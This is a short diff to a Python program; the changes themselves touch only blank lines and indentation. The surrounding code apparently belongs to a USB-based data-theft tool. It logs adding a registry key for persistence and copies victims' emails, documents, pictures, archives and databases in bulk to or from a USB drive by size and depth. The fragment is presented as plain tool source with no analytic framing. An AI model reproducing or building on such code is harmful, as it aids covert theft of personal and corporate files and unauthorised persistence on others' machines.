@@ -115,8 +115,7 @@ def main():
                                     logging.info("Persistence : Adding registry key -> Successful")
                             except Exception as e:
                                 logging.error(e)
-                                pass
-                            
+                                pass         
                         else:
                             logging.info("No {0}\\agent directory".format(usbMountLetter))
 
@@ -145,7 +144,7 @@ def main():
                                         copy.HighDepth(conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                         copy.HighDepth(conf.Compress(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                         copy.HighDepth(conf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
-
+                                        
                                     elif re.match(r"^\D?$", usbFolder) and os.environ["USERPROFILE"] not in targetPath:
                                         copy.MediumDepth(conf.Emails(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                         copy.HighDepth(conf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
@@ -153,7 +152,6 @@ def main():
                                         copy.HighDepth(conf.Compress(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                         copy.HighDepth(conf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
                                         copy.HighDepth(conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
-
                                     else:
                                         continue
 
